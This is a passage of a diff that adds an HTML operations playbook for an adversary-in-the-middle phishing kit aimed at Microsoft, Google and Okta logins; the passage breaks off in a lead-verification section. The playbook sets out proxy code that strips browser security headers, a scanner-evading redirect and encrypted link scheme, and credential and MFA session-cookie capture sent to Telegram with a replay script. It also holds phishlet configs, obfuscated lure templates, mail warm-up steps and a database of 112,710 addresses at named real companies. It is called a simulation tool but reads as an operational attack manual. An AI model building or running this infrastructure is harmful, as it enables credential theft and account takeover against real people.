@@ -1,0 +1,1514 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FM-000 — OBA 7 Unified Systems</title>
+<style>
+  :root {
+    --paper: #f7f5f0;
+    --ink: #1a1814;
+    --ink-dim: #5c5852;
+    --ink-faint: #8a8680;
+    --accent: #c41e3a;
+    --accent-dim: #8b1528;
+    --rule: #d4d0c8;
+    --surface: #ede9e2;
+    --code-bg: #e8e4dc;
+    --note-bg: #fef3e8;
+    --note-border: #f0c070;
+    --warn-bg: #fde8e8;
+    --warn-border: #e07070;
+  }
+  @font-face {
+    font-family: 'JetBrains Mono';
+    src: local('JetBrains Mono'), local('Menlo'), local('Consolas'), local('monospace');
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: "Iowan Old Style", "Palatino Linotype", Palatino, Georgia, serif;
+    font-size: 17px;
+    line-height: 1.7;
+    color: var(--ink);
+    background: var(--paper);
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+  }
+
+  .cover {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    padding: 80px 0;
+    position: relative;
+    border-bottom: 1px solid var(--rule);
+  }
+  .cover::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 4px;
+    background: var(--accent);
+  }
+  .cover .classification {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.65rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.15em;
+    color: var(--accent);
+    margin-bottom: 52px;
+    text-align: center;
+  }
+  .cover .fm-number {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.75rem;
+    font-weight: 400;
+    color: var(--ink-dim);
+    letter-spacing: 0.12em;
+    margin-bottom: 12px;
+    text-align: center;
+  }
+  .cover h1 {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 2.2rem;
+    font-weight: 700;
+    letter-spacing: -0.03em;
+    text-align: center;
+    line-height: 1.2;
+    margin-bottom: 8px;
+    color: var(--ink);
+  }
+  .cover .subtitle {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.85rem;
+    color: var(--ink-dim);
+    text-align: center;
+    letter-spacing: 0.06em;
+    margin-bottom: 48px;
+  }
+  .cover .meta {
+    text-align: center;
+    font-size: 0.75rem;
+    color: var(--ink-faint);
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    line-height: 1.8;
+  }
+  .cover .rule {
+    width: 60px;
+    height: 1px;
+    background: var(--rule);
+    margin: 32px auto;
+  }
+
+  .content {
+    max-width: 720px;
+    margin: 0 auto;
+    padding: 0 32px 80px;
+  }
+  .content > * {
+    margin-bottom: 28px;
+  }
+
+  h2 {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 1.05rem;
+    font-weight: 700;
+    letter-spacing: -0.01em;
+    color: var(--ink);
+    margin-top: 56px;
+    margin-bottom: 10px;
+    padding-top: 20px;
+    border-top: 1px solid var(--rule);
+    position: relative;
+  }
+  h2::before {
+    content: '\00A7';
+    position: absolute;
+    left: -28px;
+    top: 18px;
+    font-size: 0.85rem;
+    color: var(--accent);
+    font-weight: 400;
+  }
+  h3 {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.85rem;
+    font-weight: 600;
+    color: var(--ink);
+    margin-top: 32px;
+    margin-bottom: 6px;
+    letter-spacing: 0.02em;
+  }
+
+  p {
+    margin-bottom: 16px;
+    color: var(--ink);
+    text-align: justify;
+    hyphens: auto;
+  }
+
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--rule);
+    border-radius: 2px;
+    padding: 20px 24px;
+    overflow-x: auto;
+    margin: 20px 0;
+    font-size: 0.78rem;
+    line-height: 1.55;
+  }
+  pre code {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.78rem;
+    color: var(--ink);
+  }
+  code {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.85em;
+    background: var(--code-bg);
+    padding: 1px 5px;
+    border-radius: 2px;
+  }
+
+  .note {
+    background: var(--note-bg);
+    border-left: 3px solid var(--note-border);
+    padding: 14px 18px;
+    margin: 24px 0;
+    font-size: 0.9rem;
+    color: #5c3a10;
+    border-radius: 0 3px 3px 0;
+  }
+  .note strong { color: #8a4a00; }
+  .warn {
+    background: var(--warn-bg);
+    border-left: 3px solid var(--warn-border);
+    padding: 14px 18px;
+    margin: 24px 0;
+    font-size: 0.9rem;
+    color: #5c1010;
+    border-radius: 0 3px 3px 0;
+  }
+  .warn strong { color: #8a0000; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 20px 0;
+    font-size: 0.85rem;
+  }
+  th {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.68rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    color: var(--ink-dim);
+    text-align: left;
+    padding: 10px 14px 6px;
+    border-bottom: 2px solid var(--rule);
+  }
+  td {
+    padding: 8px 14px;
+    border-bottom: 1px solid var(--rule);
+    color: var(--ink);
+  }
+  tr:last-child td { border-bottom: none; }
+
+  kbd {
+    display: inline-block;
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.72rem;
+    font-weight: 600;
+    padding: 2px 8px;
+    border: 1.5px solid #b0aaa0;
+    border-radius: 3px;
+    background: #f0ece4;
+    color: var(--ink);
+    box-shadow: 0 1px 0 #b0aaa0;
+    margin: 0 2px;
+  }
+
+  .footer {
+    margin-top: 64px;
+    padding-top: 16px;
+    border-top: 1px solid var(--rule);
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.65rem;
+    color: var(--ink-faint);
+    letter-spacing: 0.04em;
+    display: flex;
+    justify-content: space-between;
+  }
+
+  .margin-note {
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.65rem;
+    color: var(--ink-faint);
+    letter-spacing: 0.04em;
+    float: right;
+    clear: right;
+    width: 160px;
+    margin-right: -180px;
+    margin-top: 4px;
+    line-height: 1.4;
+    text-align: left;
+    hyphens: none;
+  }
+  @media (max-width: 1100px) {
+    .margin-note { display: none; }
+  }
+
+  .step {
+    counter-increment: step-counter;
+    padding-left: 12px;
+    border-left: 3px solid var(--rule);
+    margin: 16px 0 16px 8px;
+    transition: border-color 0.2s;
+  }
+  .step:hover { border-left-color: var(--accent); }
+  .step::before {
+    content: counter(step-counter);
+    font-family: "JetBrains Mono", "Menlo", "Consolas", monospace;
+    font-size: 0.7rem;
+    font-weight: 700;
+    color: var(--accent);
+    display: block;
+    margin-bottom: 2px;
+  }
+
+  @media print {
+    body { font-size: 12px; }
+    .content { max-width: 100%; padding: 0 40px; }
+    .margin-note { display: none; }
+    pre, code { font-size: 10px; }
+    h2 { page-break-before: always; }
+    h2:first-of-type { page-break-before: avoid; }
+    .cover { page-break-after: always; }
+  }
+</style>
+</head>
+<body>
+
+<div class="cover">
+  <div class="classification">INTERNAL — RESTRICTED</div>
+  <div class="fm-number">FM-000</div>
+  <h1>OBA 7 &mdash; Unified Systems</h1>
+  <div class="subtitle">Master Operations Playbook</div>
+  <div class="rule"></div>
+  <div class="meta">
+    STRASSER &#x271B; LAB<br>
+    Version 1.3 &middot; June 2026<br>
+    Classification: Internal
+  </div>
+</div>
+
+<div class="content">
+
+<h2>Overview</h2>
+
+<p>The master operations playbook for the GLNT Phish Kit &mdash; an Evilginx-style Adversary-in-the-Middle (AiTM) reverse proxy framework for authorized phishing simulations. This is the single source of truth. Sub-playbooks (FM-001 through FM-004) expand on individual components; this document ties them together.</p>
+
+<p><strong>Cross-references:</strong> FM-001 (Phishlets), FM-002 (Lures), FM-003 (Campaign Manager), FM-004 (Domain Architecture)</p>
+
+<h2>1. System Architecture</h2>
+
+<pre><code>                          INTERNET
+                             │
+              ┌──────────────┴──────────────┐
+              │   Cloudflare CDN (TLS edge)  │  cdn-config/worker.js
+              │   • TLS termination          │  -- Bot UA blocking (14 patterns)
+              │   • Origin IP hidden         │  -- Server header → "cloudflare"
+              │   • Worker routes *.domain   │  -- wrangler.toml (2 routes)
+              └──────────────┬──────────────┘
+                             │  HTTP (plain, CF→origin)
+                             ▼
+              ┌──────────────────────────────────────────────┐
+              │           EC2 t2.micro (Ubuntu 22.04)        │
+              │                                              │
+              │  ┌──────────────────────────────────────┐   │
+              │  │  PROXY SERVER  (Go, Port 9091)        │   │
+              │  │  proxy-server/main.go                 │   │
+              │  │                                        │   │
+              │  │  ┌──────────┐  ┌──────────────────┐   │   │
+              │  │  │Bootloader│  │ Reverse Proxy     │   │   │
+              │  │  │(embedded)│  │ (httputil.Reverse │   │   │
+              │  │  │ decrypts │  │  Proxy)           │   │   │
+              │  │  │ fragment │  │                    │   │   │
+              │  │  │ sets _s  │  │ Body rewriter:    │   │   │
+              │  │  │ cookie   │  │  allUpstreamHosts │   │   │
+              │  │  └──────────┘  │  → ourHost        │   │   │
+              │  │                │                    │   │   │
+              │  │  ┌──────────┐  │ Header stripper:  │   │   │
+              │  │  │Phishlet  │  │  CSP, XFO, HSTS,  │   │   │
+              │  │  │Matcher   │  │  cookie secure,   │   │   │
+              │  │  │(allUpstr │  │  cookie domain     │   │   │
+              │  │  │eamHosts) │  │                    │   │   │
+              │  │  └──────────┘  │ Cred extractor:   │   │   │
+              │  │                │  form field match  │   │   │
+              │  │  ┌──────────┐  │                    │   │   │
+              │  │  │Rate Lim  │  │ CDN router:       │   │   │
+              │  │  │10 req/min│  │  /ests/ /shared/  │   │   │
+              │  │  │per IP    │  │  → aadcdn.msft    │   │   │
+              │  │  └──────────┘  └──────────────────┘   │   │
+              │  └──────────────────────────────────────┘   │
+              │          │                                   │
+              │  ┌───────┴───────────────────────────────┐  │
+              │  │  ANALYTICS SERVER  (Go, Port 9092)     │  │
+              │  │  analytics-server/main.go              │  │
+              │  │  • Reads data/captures.jsonl (mtime)   │  │
+              │  │  • Summary cards + funnel + timeline   │  │
+              │  │  • Time bucketing (60-min windows)     │  │
+              │  │  • Token auth required                 │  │
+              │  │  • Auto-purge via MAX_AGE_HOURS env    │  │
+              │  └──────────────────────────────────────┘  │
+              │          │                                   │
+              │  ┌───────┴───────────────────────────────┐  │
+              │  │  CAMPAIGN MANAGER (Go, Port 9093)      │  │
+              │  │  campaign-manager/web/server.go        │  │
+              │  │  • Web UI: browser-based, 4-step       │  │
+              │  │  • TUI: Bubble Tea, SSH-friendly       │  │
+              │  │  • Shared core/: link, verify, preview │  │
+              │  │  • Token + IP allowlist auth           │  │
+              │  └──────────────────────────────────────┘  │
+              └──────────────┬───────────────────────────────┘
+                             │
+              ┌──────────────┼──────────────┐
+              │              │              │
+              ▼              ▼              ▼
+        login.live.com   accounts.    *.okta.com
+        login.micro      google.com
+        softonline.com</code></pre>
+
+<h3>Request Flow (end-to-end, 10 seconds)</h3>
+
+<pre><code>  1. Victim clicks link in email
+     https://auth.glnt.cc/#H4sIAA... (encrypted fragment in URL hash)
+
+  2. GET / → Bootloader HTML (100ms decrypt)
+     JavaScript: AES-256-GCM decrypt fragment → set _s cookie → location.reload()
+
+  3. GET / (now with _s cookie) → Proxy matches phishlet (matchPhishlet)
+     → httputil.ReverseProxy to upstream identity provider
+
+  4. Real login page rendered → Victim enters username + password
+     POST body parsed by extractUsername/extractPassword via phishlet field config
+
+  5. MFA challenge proxied → Victim completes MFA
+     Session cookies returned by identity provider → captured via Set-Cookie headers
+
+  6. Capture trigger (notifyCapture, goroutine):
+     ┌─ writeEvent() → data/captures.jsonl (JSONL append, 0600)
+     └─ sendTelegramMessage() + sendTelegramDocument()
+        • 🔴 FULL CAPTURE message + .txt attachment with cookie replay script
+        • Single notification per victim (MFA-complete only)</code></pre>
+
+<h3>Port Map</h3>
+
+<table>
+  <thead><tr><th>Port</th><th>Service</th><th>Exposure</th><th>Auth</th></tr></thead>
+  <tbody>
+    <tr><td>9091</td><td>Proxy server</td><td>Cloudflare IPs only</td><td>None (behind CF)</td></tr>
+    <tr><td>9092</td><td>Analytics dashboard</td><td>Your IP only</td><td>--token required</td></tr>
+    <tr><td>9093</td><td>Campaign Manager</td><td>Your IP / SSH tunnel</td><td>--token + ALLOWED_IPS</td></tr>
+    <tr><td>22</td><td>SSH</td><td>Your IP/32</td><td>Key pair</td></tr>
+  </tbody>
+</table>
+
+<h2>2. Domain Infrastructure</h2>
+
+<h3>Multi-Host Setup (3 Subdomains for 4+ Providers)</h3>
+
+<p>The <code>UpstreamHosts</code> field in <code>Phishlet</code> struct enables one phishlet to proxy multiple identity provider hosts. Microsoft's authentication flow crosses <code>login.live.com</code> and <code>login.microsoftonline.com</code> &mdash; without multi-host support this would require two separate subdomains.</p>
+
+<table>
+  <thead><tr><th>Subdomain</th><th>Phishlet</th><th>Upstream Hosts</th><th>Handles</th></tr></thead>
+  <tbody>
+    <tr><td><code>auth.&lt;domain&gt;</code></td><td>microsoft-personal</td><td>login.live.com, login.microsoftonline.com</td><td>All Microsoft accounts</td></tr>
+    <tr><td><code>accounts.&lt;domain&gt;</code></td><td>google</td><td>accounts.google.com</td><td>Google Workspace</td></tr>
+    <tr><td><code>idp.&lt;domain&gt;</code></td><td>okta</td><td>*.okta.com (wildcard suffix match)</td><td>Any Okta tenant</td></tr>
+  </tbody>
+</table>
+
+<h3>DNS Records (Cloudflare)</h3>
+
+<pre><code>auth.&lt;domain&gt;       A    &lt;EC2_IP&gt;    Orange cloud ON
+accounts.&lt;domain&gt;   A    &lt;EC2_IP&gt;    Orange cloud ON
+idp.&lt;domain&gt;        A    &lt;EC2_IP&gt;    Orange cloud ON</code></pre>
+
+<h3>Cloudflare Worker (<code>cdn-config/</code>)</h3>
+
+<pre><code>cdn-config/
+├── worker.js       # Reverse proxy, bot blocking, header overrides
+└── wrangler.toml   # 2 routes: &lt;domain&gt;/* and *.&lt;domain&gt;/*</code></pre>
+
+<pre><code>cd cdn-config
+npx wrangler login
+npx wrangler deploy
+npx wrangler secret put ORIGIN_URL    # paste: http://&lt;EC2-IP&gt;:9091</code></pre>
+
+<h3>Cloudflare SSL/TLS</h3>
+
+<p>Set to <strong>Flexible</strong> &mdash; Cloudflare terminates TLS for victims, connects to EC2 via plain HTTP. This is critical because the proxy strips cookie Secure flags (so cookies work over the HTTP origin connection).</p>
+
+<h3>Phishlet Matching Logic (<code>proxy-server/phishlet.go</code>)</h3>
+
+<p><code>matchPhishlet()</code> checks the upstream URL host against each phishlet's primary <code>Upstream</code> field and its <code>UpstreamHosts</code> array. For Okta (<code>upstream: "okta.com"</code>), <code>hostMatchesHost()</code> uses a suffix match &mdash; so <code>acme.okta.com</code> and <code>bigcorp.okta.com</code> both match.</p>
+
+<h2>3. Attack Pipeline</h2>
+
+<h3>Link Generation → Victim Click → Bootloader → Proxy → Credential Capture → MFA → Telegram</h3>
+
+<p><strong>Step 1: Link Generation</strong> (<code>payload-generator/main.go</code>, <code>campaign-manager/core/link.go</code>)</p>
+
+<pre><code>cd payload-generator
+go run . \
+  --key &lt;BASE64_32BYTE_KEY&gt; \
+  --email victim@company.com \
+  --redirect "https://login.microsoftonline.com/common/oauth2/authorize?client_id=CLIENT_ID&amp;redirect_uri=https://auth.your-domain.com&amp;response_type=code&amp;prompt=login" \
+  --campaign my-campaign</code></pre>
+
+<p>The payload inside the URL fragment (<code>#&lt;data&gt;</code>):</p>
+
+<pre><code>{"v":"1","b":"microsoft","t":"shared-doc","r":"https://login.microsoftonline.com/...","c":"my-campaign","ts":1680000000}</code></pre>
+
+<p>&mdash; AES-256-GCM encrypted with 12-byte random nonce<br>
+&mdash; 3 random bytes prepended before base64url encoding (no fixed <code>bXY9</code> signature)<br>
+&mdash; <code>e</code> (email) field optional &mdash; omit for bulk campaigns without per-victim tracking<br>
+&mdash; <code>prompt=login</code> parameter forces fresh authentication even if victim has existing cookies</p>
+
+<p><strong>Step 2: Victim Click</strong></p>
+
+<p>The URL fragment (<code>#...</code>) is never sent to the server in the HTTP request. Email scanners, URL reputation checkers, and network monitors see only the bare domain &mdash; the encrypted payload exists solely in the victim's browser memory after JavaScript decryption.</p>
+
+<p><strong>Step 3: Bootloader</strong> (<code>proxy-server/bootloader.html</code>, embedded via <code>embed.FS</code>)</p>
+
+<pre><code>// On page load with no _s cookie:
+const hash = window.location.hash.substring(1);       // get encrypted fragment
+const raw = base64urlDecode(hash);                     // strip 3-byte random prefix
+const decrypted = aesGcmDecrypt(raw, _k);              // AES-256-GCM decrypt
+const cfg = JSON.parse(decrypted);                     // LureConfig
+document.cookie = '_s=' + encodeURIComponent(cfg.r);   // set upstream cookie
+document.cookie = '_c=' + cfg.c;                       // set campaign cookie
+location.reload();                                     // reload → proxy flow</code></pre>
+
+<p><strong>Step 4: Proxy Handshake</strong> (<code>proxy-server/main.go</code>)</p>
+
+<pre><code>parseHTTPRequest()
+  → blockBots()         // 14 crawler UA patterns → 404
+  → securityHeaders()   // X-Content-Type-Options, Referrer-Policy
+  → MaxBytesHandler(64KB)
+  → rateLimiter.Middleware()  // 10 req/min per IP, 429 on overflow
+  → handleRequest()
+      → no _s cookie?  → serve bootloader HTML
+      → has _s cookie?  → url.QueryUnescape(value)
+          → matchPhishlet(phishlets, upstreamURL)
+              → hostMatchesHost(requestHost, phishlet.Upstream)
+              → hostMatchesHost(requestHost, each UpstreamHosts entry)
+          → serveProxy(w, r, upstreamURL, phishlet)</code></pre>
+
+<p><strong>Step 5: Reverse Proxy</strong> (<code>serveProxy()</code>)</p>
+
+<pre><code>proxy := &amp;httputil.ReverseProxy{
+    Director: func(req *http.Request) {
+        // CDN routing: /ests/*, /shared/* → aadcdn.msftauth.net (Microsoft CDN)
+        cdnHost := target.Host
+        if strings.HasPrefix(req.URL.Path, "/ests/") || strings.HasPrefix(req.URL.Path, "/shared/") {
+            cdnHost = "aadcdn.msftauth.net"
+        }
+        req.URL.Scheme = target.Scheme
+        req.URL.Host = cdnHost
+        req.Host = cdnHost
+
+        // Strip Accept-Encoding → upstream returns uncompressed (we need to rewrite body)
+        req.Header.Del("Accept-Encoding")
+
+        // Rewrite Referer from our domain back to upstream
+        // Strip _s, _c cookies (our internal cookies, don't leak to upstream)
+    },
+    ModifyResponse: func(resp *http.Response) error {
+        rewriteResponse(resp, target.Host, pl.Hostname, pl)  // headers
+        rewriteBody(resp, pl.Hostname, pl)                    // HTML/CSS/JS/JSON
+        go notifyCapture(r, reqBody, victimCookies, capturedCookies, upstream, pl)
+        return nil
+    },
+    Transport: &amp;http.Transport{
+        TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: true},
+    },
+}</code></pre>
+
+<p><strong>Step 6: Response Rewriting</strong></p>
+
+<p><code>rewriteResponse()</code> strips from response headers:</p>
+
+<p>&mdash; <code>Content-Security-Policy</code> + <code>Content-Security-Policy-Report-Only</code><br>
+&mdash; <code>X-Frame-Options</code><br>
+&mdash; <code>Strict-Transport-Security</code><br>
+&mdash; Cookie <code>Secure</code> flag and <code>Domain</code> attribute (on all <code>allUpstreamHosts()</code>)</p>
+
+<p><code>rewriteBody()</code> replaces every occurrence of each upstream hostname with <code>phishlet.Hostname</code> in:</p>
+
+<p>&mdash; <code>text/html</code>, <code>text/javascript</code>, <code>application/javascript</code>, <code>application/json</code>, <code>text/css</code>, <code>text/plain</code></p>
+
+<p><strong>Step 7: Credential Extraction</strong> (<code>notifyCapture()</code>)</p>
+
+<pre><code>username = pl.extractUsername(bodyStr)   // iterates pl.CredentialFields.Username
+password = pl.extractPassword(bodyStr)   // iterates pl.CredentialFields.Password</code></pre>
+
+<p>Event types determined by state:</p>
+
+<p>&mdash; No username &rarr; <code>page_load</code> (logged to JSONL only, no Telegram)<br>
+&mdash; Username captured, no session cookies &rarr; <code>credential_submit</code> (logged to JSONL, no Telegram for now)<br>
+&mdash; Session cookies present &rarr; <code>mfa_complete</code> &rarr; Telegram notification + .txt attachment</p>
+
+<p><strong>Step 8: <code>/r</code> Redirect Hop</strong> (email scanner evasion)</p>
+
+<pre><code># Usage: /r?t=&lt;base64url-encoded-https-url&gt;</code></pre>
+
+<p>The link in the email body points to <code>https://auth.domain.com/r?t=&lt;encoded_target&gt;</code>. Email scanners follow the 302 redirect and see a benign destination. The victim's browser follows the redirect to the fragment-based link which triggers the bootloader.</p>
+
+<h2>4. Phishlets</h2>
+
+<h3>Phishlet Schema (<code>proxy-server/phishlet.go</code>)</h3>
+
+<pre><code>type Phishlet struct {
+    Name            string              `json:"name"`             // short key: "microsoft"
+    Label           string              `json:"label"`            // human: "Microsoft 365"
+    Upstream        string              `json:"upstream"`         // primary upstream URL
+    Hostname        string              `json:"hostname"`         // our subdomain
+    UpstreamHosts   []string            `json:"upstream_hosts"`   // additional upstreams (multi-host)
+    ProxyPaths      []string            `json:"proxy_paths"`      // paths to intercept
+    CredentialFields struct {
+        Username []string              `json:"username"`         // form field names for username
+        Password []string              `json:"password"`         // form field names for password
+    }                                   `json:"credential_fields"`
+    SessionCookies  []string            `json:"session_cookies"`  // cookie names that signal MFA complete
+    Rewrite struct {
+        StripCSP          bool          `json:"strip_csp"`
+        StripXFO          bool          `json:"strip_xfo"`
+        StripHSTS         bool          `json:"strip_hsts"`
+        StripCookieSecure bool          `json:"strip_cookie_secure"`
+        StripCookieDomain bool          `json:"strip_cookie_domain"`
+        RewriteLocation   bool          `json:"rewrite_location"`
+    }                                   `json:"rewrite"`
+    PathMap         map[string]string   `json:"path_map"`        // path → upstream path mapping
+}</code></pre>
+
+<h3>Phishlet Inventory</h3>
+
+<h3>microsoft-personal.json (multi-host &mdash; handles both MS account types)</h3>
+
+<pre><code>{
+  "upstream": "https://login.live.com",
+  "upstream_hosts": ["https://login.microsoftonline.com"],
+  "proxy_paths": ["/", "/oauth20_authorize.srf", "/ppsecure/", "/login.srf"],
+  "credential_fields": {
+    "username": ["loginfmt", "login", "email", "username"],
+    "password": ["passwd", "password", "Password", "secret"]
+  },
+  "session_cookies": ["MSPAuth", "MSPRequ", "MSPOK", "ESTSAUTH", "ESTSAUTHPERSISTENT",
+                       "ESTSAUTHLIGHT", "SignInStateCookie"]
+}</code></pre>
+
+<p>This is the primary Microsoft phishlet. Covers both personal accounts (Outlook/Hotmail/Live) and organization accounts (Azure AD/Entra ID) through a single subdomain. The auth flow is: <code>login.live.com</code> &rarr; <code>login.microsoftonline.com</code> &rarr; <code>office.com</code>.</p>
+
+<h3>microsoft.json (organization-only)</h3>
+
+<pre><code>{
+  "upstream": "https://login.microsoftonline.com",
+  "proxy_paths": ["/", "/common/", "/organizations/", "/consumers/", "/kmsi", "/login", "/SAS/", "/federation/"],
+  "session_cookies": ["ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "SignInStateCookie"]
+}</code></pre>
+
+<h3>google.json</h3>
+
+<pre><code>{
+  "upstream": "https://accounts.google.com",
+  "proxy_paths": ["/", "/signin/", "/v3/signin/", "/_/signin/", "/ServiceLogin",
+                  "/AccountChooser", "/signin/challenge/", "/signin/oauth/"],
+  "credential_fields": {
+    "username": ["identifier", "Email", "email", "username"],
+    "password": ["Passwd", "password", "PasswdHidden"]
+  },
+  "session_cookies": ["SID", "HSID", "SSID", "APISID", "SAPISID", "__Secure-1PSID",
+                       "__Secure-3PSID", "NID", "OSID", "LSID"]
+}</code></pre>
+
+<h3>okta.json (wildcard tenant match)</h3>
+
+<pre><code>{
+  "upstream": "okta.com",
+  "proxy_paths": ["/", "/login/", "/sso/", "/api/v1/authn", "/oauth2/", "/authorize", "/signin/"],
+  "session_cookies": ["sid", "DT", "JSESSIONID", "okta_session", "tkn"]
+}</code></pre>
+
+<div class="note"><strong>Note:</strong> Okta uses bare hostname <code>"okta.com"</code> (no <code>https://</code> prefix on <code>upstream</code>). The <code>hostMatchesHost()</code> function handles this via suffix match &mdash; <code>acme.okta.com</code> and <code>bigcorp.okta.com</code> both match.</div>
+
+<h3>Adding a New Phishlet</h3>
+
+<pre><code># 1. Create the config
+cat &gt; proxy-server/phishlets/newprovider.json &lt;&lt; 'PHISHJSON'
+{
+  "name": "newprovider",
+  "label": "New Provider",
+  "upstream": "https://id.newprovider.com",
+  "hostname": "idp.your-domain.com",
+  "proxy_paths": ["/", "/login/"],
+  "credential_fields": {
+    "username": ["username", "email"],
+    "password": ["password", "pass"]
+  },
+  "session_cookies": ["SESSIONID", "AUTH_TOKEN"],
+  "rewrite": {
+    "strip_csp": true, "strip_xfo": true, "strip_hsts": true,
+    "strip_cookie_secure": true, "strip_cookie_domain": true,
+    "rewrite_location": true
+  }
+}
+PHISHJSON
+
+# 2. Rebuild and restart
+cd proxy-server &amp;&amp; go build -o proxy-srv .
+sudo systemctl restart phish-proxy</code></pre>
+
+<h2>5. Email Lures</h2>
+
+<h3>Inline HTML Lures (10 templates, paste into SuperMailer HTML Source)</h3>
+
+<pre><code>campaign-emails/email/
+├── shared-document.html         # "Document Shared With You"
+├── invoice-payment.html         # "Invoice Payment Notification"
+├── meeting-invite.html          # "Meeting Invitation"
+├── security-alert.html          # "Security Alert — Unusual Sign-in"
+├── voicemail-notification.html  # "New Voicemail Message"
+├── hr-document.html            # "Confidential HR Document"
+├── it-support.html             # "IT Support — Password Reset Required"
+├── contract-signature.html     # "Action Required: Sign Contract"
+├── expense-report.html         # "Expense Report Ready for Review"
+├── package-delivery.html       # "Package Delivery Notification"</code></pre>
+
+<h3>Attachment Lures (10 templates, attach to email in SuperMailer)</h3>
+
+<pre><code>campaign-emails/attachments/ (or lures/attachments/)
+├── docusign-wire.html           # DocuSign-branded wire authorization
+├── adobe-contract.html          # Adobe-branded contract review
+├── dropbox-share.html           # Dropbox-branded file share
+├── sharepoint-doc.html          # SharePoint document library
+├── onedrive-file.html           # OneDrive file access
+├── teams-recording.html         # Microsoft Teams meeting recording
+├── excel-shared.html            # Excel Online shared workbook
+├── gdocs-shared.html            # Google Docs shared document
+├── zoom-recording.html          # Zoom cloud recording
+└── stripe-payment.html         # Stripe payment notification</code></pre>
+
+<h3>Design Standards</h3>
+
+<p>Every lure adheres to these standards:</p>
+
+<p>&mdash; <strong>Brand-authentic layout</strong> &mdash; each template mirrors the real service's email design language<br>
+&mdash; <strong>Inline SVG logo marks</strong> &mdash; brand-specific icons (two-person silhouettes for Teams, payment card for Stripe, cloud for OneDrive, camera for Zoom, etc.)<br>
+&mdash; <strong>Outlook/MSO fallbacks</strong> &mdash; all 10 lures include <code>[if mso]</code> conditional comments, VML <code>v:roundrect</code> CTA buttons, and table-based structure that degrades gracefully in Outlook<br>
+&mdash; <strong>No email-unsafe CSS</strong> &mdash; all styles are inline, no <code>position</code>, no <code>flexbox</code>, no <code>grid</code><br>
+&mdash; <strong><code>{LINK}</code> / <code>##LINK##</code> placeholders</strong> &mdash; replaced with the phishing URL at build time<br>
+&mdash; <strong><code>{RECIPIENT_NAME}</code> / <code>##victimemail##</code></strong> &mdash; replaced at send time or build time<br>
+&mdash; <strong>Obfuscated copies</strong> &mdash; <code>campaign-emails-obfuscated/</code> contains production versions (no <code>{PLACEHOLDER}</code> strings, no readable template names, JS-obfuscated redirects)</p>
+
+<h3>Building a Campaign Email</h3>
+
+<pre><code>cd scripts
+./build-campaign-email.sh shared-document "https://auth.your-domain.com/#&lt;fragment&gt;" "John" email.html
+# Outputs: email.html with {LINK} replaced by the phishing URL, {RECIPIENT_NAME} by "John"</code></pre>
+
+<h3>SuperMailer Integration</h3>
+
+<pre><code>1. SuperMailer → Campaign → Message → HTML Source (&lt;&gt; button)
+2. Paste entire campaign-emails/email/&lt;lure&gt;.html contents
+3. Apply → verify preview renders
+4. Send Test to yourself
+5. Run through mail-tester.com (score must be 9+/10)
+   └── If score &lt; 9: fix SPF/DKIM/DMARC on sender domain
+6. Warm-up: 10/hr (Day 1-2) → 25-50/hr (Day 3) → 50-100/hr (Day 4+)
+7. SMTP: Port 587, STARTTLS, max 2 retries, 30s timeout
+8. Monitor bounce rate &lt; 5% — pause immediately if exceeded</code></pre>
+
+<h3>Attachment Lure Workflow</h3>
+
+<pre><code>1. SuperMailer → Campaign → Message: write short body text
+2. Attach campaign-emails/attachments/&lt;brand&gt;.html
+3. Sender From Name + From Email must match attachment brand
+4. Test by opening the attachment yourself → verify redirect works
+5. Same warm-up and monitoring as inline lures</code></pre>
+
+<h2>6. Lead Management</h2>
+
+<h3>Lead Database (<code>data/</code>)</h3>
+
+<pre><code>data/
+├── master_leads.csv             # 112,710 email addresses (master DB)
+├── master_leads_verified.csv    # DNS-verified output with status columns
+├── captures.jsonl               # Live event log (gitignored, 0600 permissions)
+├── campaigns/                   # Campaign state JSON files
+└── leads/                       # Per-company CSV files (158 files)
+    ├── addus_com.csv
+    ├── blackrock_com.csv
+    ├── bloomberg_com.csv
+    └── ... (158 total, 30+ industries, 6 continents)</code></pre>
+
+<h3>Lead CSV Format</h3>
+
+<pre><code>email,first,last,domain,pattern,department,company,title,category,mx
+dirk.allison@addus.com,Dirk,Allison,addus.com,first.last,Executive,...</code></pre>
+
+<h3>Email Verifier CLI (<code>email-verifier/</code>)</h3>
+
+<pre><code>cd email-verifier
+go build -o email-verifier .
+
+# DNS-only verification (~20 min for 113K leads)
+./email-verifier --input ../data/master_leads.csv --output ../data/master_leads_verified.csv
+
+# SMTP verification with SOCKS5 proxy (~14 min with concurrency fix)
+./email-verifier --input ../data/batch.csv --output ../data/batch_verified.csv --smtp --smtp-proxy socks5://127.0.0.1:1080</code></pre>
+
+<p><strong>Verification pipeline (5 stages):</strong></p>
+
